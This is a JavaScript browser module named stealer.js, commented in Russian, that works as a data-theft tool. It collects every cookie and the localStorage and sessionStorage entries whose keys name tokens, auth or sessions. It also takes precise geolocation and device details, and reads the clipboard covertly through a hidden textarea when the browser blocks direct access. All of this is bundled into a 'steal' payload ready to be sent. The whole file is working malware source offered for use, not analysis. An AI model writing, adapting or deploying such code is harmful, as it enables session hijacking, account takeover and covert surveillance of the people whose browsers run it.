// ==== file: stealer.js ====
// language: JavaScript, target: browser
export const Stealer = {
    // Хранилище для всех украденных данных
    data: {
        cookies: [],
        localStorage: [],
        sessionStorage: [],
        clipboard: '',
        geo: null,
        battery: 'Скрыто',
        memory: 'Скрыто',
        network: 'Неизвестно',
        userAgent: '',
        screen: '',
        language: ''
    },

    // Инициализация сбора данных
    init() {
        this.collectSystemInfo();
        this.collectCookies();
        this.collectStorage();
        this.collectBattery();
        this.collectGeo();
    },

    // Сбор базовой информации о системе
    collectSystemInfo() {
        try {
            this.data.userAgent = navigator.userAgent || 'Unknown';
            this.data.screen = `${window.screen.width}x${window.screen.height}`;
            this.data.language = navigator.language || 'Unknown';
            
            // Определение памяти
            if (navigator.deviceMemory) {
                this.data.memory = navigator.deviceMemory + ' GB';
            }

            // Определение сети
            if (navigator.connection) {
                this.data.network = navigator.connection.effectiveType || 'Неизвестно';
            }
        } catch (e) {
            console.error('SystemInfo error', e);
        }
    },

    // Сбор Cookies
    collectCookies() {
        try {
            if (document.cookie) {
                document.cookie.split(';').forEach(c => {
                    const [name, ...val] = c.split('=');
                    if (name && val.length) {
                        this.data.cookies.push({ name: name.trim(), value: val.join('=') });
                    }
                });
            }
        } catch (e) {
            console.error('Cookie error', e);
        }
    },

    // Сбор данных из LocalStorage и SessionStorage
    collectStorage() {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) {
                    const val = localStorage.getItem(key);
                    if (val && (key.includes('token') || key.includes('auth') || key.includes('session') || key.includes('user') || key.includes('key'))) {
                        this.data.localStorage.push({ name: key, value: val });
                    }
                }
            }
            
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) {
                    const val = sessionStorage.getItem(key);
                    if (val && (key.includes('token') || key.includes('auth') || key.includes('session'))) {
                        this.data.sessionStorage.push({ name: key, value: val });
                    }
                }
            }
        } catch (e) {
            console.error('Storage error', e);
        }
    },

    // Сбор информации о батарее
    async collectBattery() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const charging = battery.charging ? 'Заряжается' : 'От батареи';
                this.data.battery = `${level}% (${charging})`;
            }
        } catch (e) {
            console.error('Battery error', e);
        }
    },

    // Сбор GPS координат
    collectGeo() {
        try {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        this.data.geo = `${pos.coords.latitude},${pos.coords.longitude}`;
                    },
                    () => {},
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }
        } catch (e) {
            console.error('Geo error', e);
        }
    },

    // Асинхронный сбор буфера обмена (вызывается перед отправкой)
    async collectClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                if (text && text.trim().length > 0) {
                    this.data.clipboard = text.trim().substring(0, 250); // Ограничиваем длину
                }
            }
        } catch (e) {
            // Браузер может заблокировать чтение буфера без действия пользователя
            // В таком случае создаем скрытый input для попытки чтения
            try {
                const input = document.createElement('textarea');
                input.style.position = 'absolute';
                input.style.opacity = '0';
                document.body.appendChild(input);
                input.focus();
                document.execCommand('paste');
                if (input.value && input.value.trim().length > 0) {
                    this.data.clipboard = input.value.trim().substring(0, 250);
                }
                document.body.removeChild(input);
            } catch (err) {}
        }
    },

    // Возврат всех собранных данных в одном объекте для отправки
    getAllData() {
        return {
            ua: this.data.userAgent,
            screen: this.data.screen,
            lang: this.data.language,
            battery: this.data.battery,
            memory: this.data.memory,
            network: this.data.network,
            geo: this.data.geo,
            clipboard: this.data.clipboard,
            steal: [
                ...this.data.cookies,
                ...this.data.localStorage,
                ...this.data.sessionStorage
            ]
        };
    }
};
